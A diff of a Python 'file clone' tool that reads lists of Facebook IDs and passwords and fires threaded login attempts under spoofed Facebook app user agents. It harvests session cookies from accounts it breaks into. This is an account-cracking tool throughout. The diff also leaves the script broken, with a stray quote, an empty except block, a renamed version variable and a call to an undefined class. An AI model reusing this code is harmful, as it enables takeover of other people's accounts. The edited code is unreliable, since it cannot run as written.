@@ -1,4 +1,5 @@
-import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib, threading, tempfile, zipfile
+
+import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib
 from os import system
 from io import BytesIO
 from time import localtime as lt
@@ -6,14 +7,16 @@ from pip._vendor import requests
 from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from urllib.parse import quote
-
-#----------------\<-HIDDEN-SERVICE->/----------------#
-
 #----------------\<-COLOR->/----------------#
-G = "\033[1;92m"; W = "\x1b[38;5;15m"; B = "\033[1;34m"
-Y = "\x1b[38;5;226m"; A = "\x1b[38;5;123m"; R = "\33[1;91m"
-O = "\x1b[38;5;81m"; X = "\x1b[38;5;205m"; P = "\x1b[10;95m"
-
+G = "\033[1;34m"
+W = "\x1b[38;5;15m"
+B = "\033[1;34m"
+Y = "\x1b[38;5;226m"
+A = "\x1b[38;5;123m"
+R = "\33[1;91m"
+O = "\x1b[38;5;81m"
+X = "\x1b[38;5;205m"
+P = "\x1b[10;95m""
 #----------------\<-STYLE->/----------------#
 xp = f"{R}<[{W}●{R}]>{W}"
 xp1 = f"{R}<[{W}1{R}]>{W}"
@@ -51,7 +54,7 @@ except ImportError as e:
         print(f"{R}━"*56)
         sys.exit()
 #----------------\<-SYS->/----------------#
-sys.stdout.write('\x1b[1;37m\x1b]2; PS~\x07')
+sys.stdout.write('\x1b[1;37m\x1b]2; PS\x07')
 #----------------\<-FILE-PATH->/----------------#
 
 #----------------\<-DATE->/----------------#
@@ -107,41 +110,40 @@ def UA():
     ___Noor_on_Fire___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
     return ___Noor_on_Fire___
 #----------------\<-VERSION->/----------------#
-version ='2.0'
+versn ='2.0'
 #----------------\<-SHORT->/----------------#
 xlinex = (f"{R}━"*56)
 #----------------\<-LOGO->/----------------#
 logo = f"""
-{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
-{R}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
-{R}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
-{R}╭━━━┳━━━╮
-{R}┃╭━╮┃╭━╮┃
-{R}┃╰━╯┃╰━━╮
-{R}┃╭━━┻━━╮┃
-{R}┃┃╱╱┃╰━╯┃
-{R}╰╯╱╱╰━━━╯
+{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
+{G}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
+{G}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
+{G}╭━━━┳━━━╮
+{G}┃╭━╮┃╭━╮┃
+{G}┃╰━╯┃╰━━╮
+{G}┃╭━━┻━━╮┃
+{G}┃┃╱╱┃╰━╯┃
+{G}╰╯╱╱╰━━━╯
 {xlinex}
 {W}  DEVELOPER {xpxx} PS{G}-{W}
 {W}  STATUS    {xpxx} Premium
 {W}  VERSION   {xpxx} V{G}/{W}{version}
 {xlinex}
-{R}⫷⫸ 𝐷𝐸𝑉 𝑃𝑆 | @p7s7s ⫷⫸
+{W}
 {xlinex}
 {xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
 {xp} DEV {xpxx} PS ~ p7s7s
 {xp} TODAYS   {xpxx} {__date__}
 {xlinex}"""
-
 #----------------\<-SELF->/----------------#
 class __PSJO__:
     def __init__(self) -> None:
@@ -292,7 +294,7 @@ class __PSJO__:
 
         self.__COOKIE__.append('y' if __co__.lower() in ['y', 'yes', '1'] else 'n')
         self.__CP__.append('y' if __cps__.lower() in ['y', 'yes', '1'] else 'n')
-        with ThreadPool(max_workers=__MAXX__) as __TEMO__:
+        with ThreadPool(max_workers=__MAXX__) as __PS__:
             __CLEAR__()
             total_ids = str(len(__fileckX__))
             print(f"{xp} TOTAL{R}/{W}IDS {xpxx} {total_ids} ")
@@ -305,17 +307,17 @@ class __PSJO__:
                     continue
                 passlist = self.plist
                 if __METHODF__ == "1":
-                    __TEMO__.submit(self.__M1X__, ids, names, passlist)
+                    __PS__.submit(self.__M1X__, ids, names, passlist)
                 elif __METHODF__ == "2":
-                    __TEMO__.submit(self.__M2X__, ids, names, passlist)
+                    __PS__.submit(self.__M2X__, ids, names, passlist)
                 elif __METHODF__ == "3":
-                    __TEMO__.submit(self.__M3X__, ids, names, passlist)
+                    __PS__.submit(self.__M3X__, ids, names, passlist)
                 elif __METHODF__ == "4":
-                    __TEMO__.submit(self.__M4X__, ids, names, passlist)
+                    __PS__.submit(self.__M4X__, ids, names, passlist)
                 elif __METHODF__ == "5":
-                    __TEMO__.submit(self.__M5X__, ids, names, passlist)
+                    __PS__.submit(self.__M5X__, ids, names, passlist)
                 else:
-                    __TEMO__.submit(self.__M1X__, ids, names, passlist)
+                    __PS__.submit(self.__M1X__, ids, names, passlist)
 
         print("\033[1;37m")
         __LINE__()
@@ -323,7 +325,7 @@ class __PSJO__:
         print(f"{xp} TOTAL OK{R}/{W}2F{R}/{W}CP {xpxx} {G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}")
         __LINE__()
         print(f"{xp} THANKS FOR USING.....! ")
-        sys.exit()   
+        sys.exit()
 
     #----------------\<-FILE-M1-GRAPH->/----------------#
     def __M1X__(self, ids, names, passlist):
@@ -363,19 +365,6 @@ class __PSJO__:
                 }
                 country_locale = random.choice(list(__locale__.keys()))
                 country_code = __locale__[country_locale]
-                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
-                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
-                fbbv = str(random.randint(10000000, 99999999))
-                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
-                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
-                width = random.randint(720, 1440)
-                height = random.randint(1080, 2560)
-                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
-                fban = random.choice(["FB4A", "FB5A", "FB6A"])
-                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-                u2a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                 data = {
                     "adid": adid,
                     "format": "json",
@@ -425,11 +414,7 @@ class __PSJO__:
                 try:
                     po = requests.post(url, data=data, headers=headers, timeout=10).json()
                 except requests.exceptions.Timeout:
-                    print(f"\n{R}[-] Timeout error for {ids} / {pas}")
-                    continue
-                except Exception as e:
-                    print(f"\n{R}[-] Exception: {str(e)}")
-                    continue
+                    
 
                 if 'session_key' in po:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
@@ -736,6 +721,5 @@ class __PSJO__:
 
 #----------------\<-LAST-CALL->/----------------#
 __CLEAR__()
-__PSJO__().__MENU__()
+__P__().__MENU__()
 #----------------\<-END-CALL->/----------------#
-sys.exit(0)
